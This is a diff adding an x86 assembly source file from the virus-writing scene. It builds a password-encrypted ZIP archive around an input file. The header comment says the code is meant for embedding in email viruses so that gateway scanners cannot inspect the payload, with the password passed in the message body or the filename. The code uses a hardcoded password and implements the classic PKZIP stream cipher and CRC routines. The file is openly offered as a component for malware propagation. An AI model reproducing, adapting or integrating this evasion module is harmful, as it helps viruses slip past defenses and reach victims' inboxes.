@@ -1,0 +1,348 @@
+
+; Constructs an encrypted .ZIP-file from an input file.
+; Written to be incorporated into e-mail virii, to evade
+; e-mail gateway scanners (as they can't decrypt the file).
+; The decryption password can be supplied in the body of
+; the e-mail, or in the filename (ie. password.is.virus.zip), etc.
+;
+
+                .386
+                .MODEL  FLAT
+                .DATA
+
+
+EXTRN           CreateFileA:PROC
+EXTRN           CloseHandle:PROC
+EXTRN           GetFileSize:PROC
+EXTRN           VirtualAlloc:PROC
+EXTRN           ReadFile:PROC
+EXTRN           WriteFile:PROC
+EXTRN           ExitProcess:PROC
+EXTRN           GetTickCount:PROC
+
+
+FILE_ATTRIBUTE_NORMAL   EQU     00000080h
+GENERIC_READ            EQU     80000000h
+GENERIC_WRITE           EQU     40000000h
+CREATE_ALWAYS           EQU     00000002h
+OPEN_EXISTING           EQU     00000003h
+PAGE_READWRITE          EQU     00000004h
+MEM_RESERVE             EQU     00002000h
+MEM_COMMIT              EQU     00001000h
+
+Input_File      DB      'INPUT.666', 0
+Output_File     DB      'ENCODED.ZIP', 0
+
+Local_Header:   DD      04034B50h       ;local file header signature
+                DW      (2*10)          ;version needed to extract
+                DW      1               ;general purpose bit flag
+                DW      0               ;compression method
+                DW      8C28h           ;last mod file time
+                DW      28E4h           ;last mod file date
+LH_CRC          DD      0               ;crc-32
+LH_Compr_Size   DD      0               ;compressed size
+LH_Uncompr_Size DD      0               ;uncompressed size
+                DW      12              ;filename length
+                DW      0               ;extra field length
+                DB      'FILENAME.TXT'  ;filename (variable size)
+End_LH:
+
+Central_Header: DD      02014B50h       ;central file header signature
+                DW      (2*10)          ;version made by
+                DW      (2*10)          ;version needed to extract
+                DW      1               ;general purpose bit flag
+                DW      0               ;compression method
+                DW      8C28h           ;last mod file time
+                DW      28E4h           ;last mod file date
+CH_CRC          DD      0               ;crc-32
+CH_Compr_Size   DD      0               ;compressed size
+CH_Uncompr_Size DD      0               ;uncompressed size
+                DW      12              ;filename length
+                DW      0               ;extra field length
+                DW      0               ;file comment length
+                DW      0               ;disk number start
+                DW      0               ;internal file attributes
+                DD      0               ;external file attributes
+                DD      0               ;relative offset of local header
+                DB      'FILENAME.TXT'  ;filename (variable size)
+End_CH:
+
+End_CH_Dir:     DD      06054B50h       ;end of central dir signature
+                DW      0               ;number of this disk
+                DW      0               ;number of the disk with the
+                                        ;start of the central directory
+                DW      1               ;total number of entries in
+                                        ;the central dir on this disk
+                DW      1               ;total number of entries in
+                                        ;the central dir
+                DD      (End_CH-Central_Header);size of the central directory
+ECD_Central_Dir DD      (Central_Header-Local_Header) ;offset of start of central
+                                        ;directory with respect to
+                                        ;the starting disk number
+                DW      0               ;zipfile comment length
+End_End_CH_Dir:
+
+Cipher_Key      DB      'succubus'      ; The .ZIP password.
+End_Cipher_Key:
+
+Key0            DD      305419896       ; The encryption keys.
+Key1            DD      591751049
+Key2            DD      878082192
+
+CRC_Init        DD      0FFFFFFFFh
+
+File_Handle     DD      0
+Archive_Size    DD      0
+Byte_To_CRC     DB      0
+Temp            DD      0
+
+                .CODE
+START:
+                XOR     EBP, EBP                ; EBP is always 0.
+
+                PUSH    EBP                     ; Open file to encapsulate
+                PUSH    EBP                     ; in encrypted Zip-archive.
+                PUSH    OPEN_EXISTING
+                PUSH    EBP
+                PUSH    EBP
+                PUSH    GENERIC_READ
+                PUSH    OFFSET Input_File
+                CALL    CreateFileA
+
+                MOV     File_Handle, EAX
+
+                PUSH    EBP                     ; Get it's size.
+                PUSH    File_Handle
+                CALL    GetFileSize
+
+                MOV     LH_Uncompr_Size, EAX    ; Fill-in some of Zip-header.
+                MOV     CH_Uncompr_Size, EAX
+
+                ADD     EAX, 12                 ; Add size of random
+                                                ; encryption header.
+                MOV     LH_Compr_Size, EAX
+                MOV     CH_Compr_Size, EAX
+
+                ADD     ECD_Central_Dir, EAX
+                MOV     Archive_Size, EAX
+
+                PUSH    PAGE_READWRITE          ; Allocate memory for input.
+                PUSH    MEM_RESERVE OR MEM_COMMIT
+                PUSH    EAX
+                PUSH    EBP
+                CALL    VirtualAlloc
+
+                MOV     EDI, EAX
+
+                ADD     EAX, 12                 ; After the random encryption
+                                                ; header.
+
+                PUSH    EBP                     ; Read-in the file to encode.
+                PUSH    OFFSET Temp
+                PUSH    Archive_Size
+                PUSH    EAX
+                PUSH    File_Handle
+                CALL    ReadFile
+
+                PUSH    File_Handle
+                CALL    CloseHandle
+
+                PUSH    EBP                     ; Create output .ZIP-file.
+		PUSH    FILE_ATTRIBUTE_NORMAL
+                PUSH    CREATE_ALWAYS
+                PUSH    EBP
+                PUSH    EBP
+                PUSH    GENERIC_WRITE
+                PUSH    OFFSET Output_File
+                CALL    CreateFileA
+
+                MOV     File_Handle, EAX
+
+                CALL    Generate_Zip            ; Construct the zip-package.
+
+                PUSH    (End_LH-Local_Header)   ; Write Local File Header.
+                POP     ECX
+                MOV     EDX, OFFSET Local_Header
+                CALL    Write_File
+
+                MOV     ECX, Archive_Size       ; Write encoded file packet.
+                MOV     EDX, EDI
+                CALL    Write_File
+
+                ; Write Central File Header + End Of Central Directory.
+
+                PUSH    (End_End_CH_Dir-Central_Header)
+                POP     ECX
+                PUSH    OFFSET Central_Header
+                POP     EDX
+                CALL    Write_File
+
+                PUSH    File_Handle
+                CALL    CloseHandle
+
+Exit:           PUSH    EBP
+                CALL    ExitProcess
+
+
+Write_File:
+                PUSH    EBP
+                PUSH    OFFSET Temp
+                PUSH    ECX
+                PUSH    EDX
+                PUSH    File_Handle
+                CALL    WriteFile
+
+                RETN
+
+
+Generate_Zip:
+                PUSHAD
+
+                ; Initialize the 3 encryption
+                ; keys with the password.
+
+                PUSH    (End_Cipher_Key-Cipher_Key)
+                POP     ECX
+
+                MOV     ESI, OFFSET Cipher_Key
+
+Init_Keys:      LODSB
+                CALL    Update_Keys             ; Update keys with AL.
+
+                LOOP    Init_Keys
+
+                ; Generate a random 12-byte encryption header.
+
+                PUSH    EDI
+
+                CALL    GetTickCount            ; This header should be fully
+                                                ; random but this will do
+                STOSD                           ; aswell (less code).
+
+                XOR     EAX, 0DEADBEEFh
+                STOSD
+
+                ADD     EAX, -666
+                STOSD
+
+                MOV     ECX, LH_Uncompr_Size    ; Calculate the CRC of the
+                MOV     ESI, EDI                ; stored data.
+                CALL    CRC
+
+                MOV     LH_CRC, EAX             ; Save it.
+                MOV     CH_CRC, EAX
+
+                DEC     EDI
+
+                ROL     EAX, (1*8)              ; The last byte of the random
+                STOSB                           ; encryption header must be
+                                                ; the high byte of the CRC.
+                POP     EDI
+
+                ; Encrypt the random encryption header
+                ; and the actual data stream.
+
+                MOV     ECX, LH_Compr_Size
+
+Encrypt_Stream: MOV     EAX, Key2
+                OR      AL, 2
+
+                MOV     EBX, EAX
+
+                XOR     AL, 1
+                MUL     BX
+
+                XOR     AH, [EDI]
+                XCHG    [EDI], AH
+
+                MOV     AL, AH
+                CALL    Update_Keys
+
+                INC     EDI
+
+                LOOP    Encrypt_Stream
+
+                POPAD
+
+                RETN
+
+
+; Updates the 3 encryption keys with the character in AL.
+Update_Keys:
+                PUSHAD
+
+                MOV     EDX, Key0
+                CALL    Update_CRC
+
+                NOT     EAX
+
+                MOV     Key0, EAX
+
+                MOVZX   EAX, AL
+
+                ADD     EAX, Key1
+                MOV     ECX, 134775813
+                MUL     ECX
+
+                INC     EAX
+
+                MOV     Key1, EAX
+
+                MOV     EDX, Key2
+                SHR     EAX, (3*8)
+                CALL    Update_CRC
+
+                NOT     EAX
+
+                MOV     Key2, EAX
+
+                POPAD
+
+                RETN
+
+
+Update_CRC:
+                PUSH    1
+                POP     ECX
+
+                MOV     CRC_Init, EDX
+
+                MOV     ESI, OFFSET Byte_To_CRC
+                MOV     [ESI], AL
+
+CRC:            PUSH    EDX                     ; Original code by Sepultura.
+		PUSH    ESI
+
+                PUSH    -1
+                POP     EDX
+
+                XCHG    CRC_Init, EDX
+
+		CLD
+
+Load_Character: LODSB
+
+		XOR     DL, AL
+
+		MOV     AL, 8
+
+CRC_Byte:       SHR     EDX, 1
+                JNC     Loop_CRC_Byte
+
+                XOR     EDX, 0EDB88320h
+
+Loop_CRC_Byte:  DEC     AL
+		JNZ     CRC_Byte
+
+                LOOP    Load_Character
+
+Exit_Calc_CRC:  XCHG    EDX, EAX
+
+                NOT     EAX
+
+		POP     ESI
+		POP     EDX
+
+                RETN
+
+                END     START
